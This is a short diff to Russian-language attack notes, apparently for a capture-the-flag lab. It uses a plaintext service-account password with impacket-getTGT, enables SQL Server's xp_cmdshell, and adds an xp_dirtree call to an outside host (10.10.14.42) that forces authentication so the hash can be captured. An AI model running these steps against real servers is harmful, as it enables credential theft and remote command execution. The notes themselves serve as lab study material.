@@ -94,6 +94,7 @@ impacket-getTGT scrm.local/sqlsvc:Pegasus60
 export KRB5CCNAME=sqlsvc.ccache
 
 или по TGS - также но с генерацией TGS
+
 ---Включить вполнени xp_cmdshell
 
 enable_xp_cmdshell
@@ -101,6 +102,8 @@ enable_xp_cmdshell
 reconfigure
 
 xp_cmdshell
+
+xp_dirtree "\\10.10.14.42\sass"  --- перейти по адресу с аутентификацией
 
 ********************
 select name from sys.databases;  (перечислить все базы данных)
